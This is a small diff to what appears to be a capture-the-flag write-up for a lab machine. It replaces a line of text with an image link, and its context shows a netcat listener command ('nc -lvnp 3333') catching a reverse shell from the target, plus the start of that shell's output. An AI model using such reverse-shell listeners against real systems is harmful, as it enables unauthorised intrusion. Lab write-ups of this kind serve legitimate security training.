@@ -110,7 +110,8 @@ and before uploading I start netcat
 
 <pre><code>> sudo nc -lvnp 3333</code></pre>
 
-and we are in
+![image](https://github.com/user-attachments/assets/0a1fb19e-60ce-4f7a-bdf6-81acaeda3425)
+
 
 <pre><code>Connection from 10.10.11.25:60296
 Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
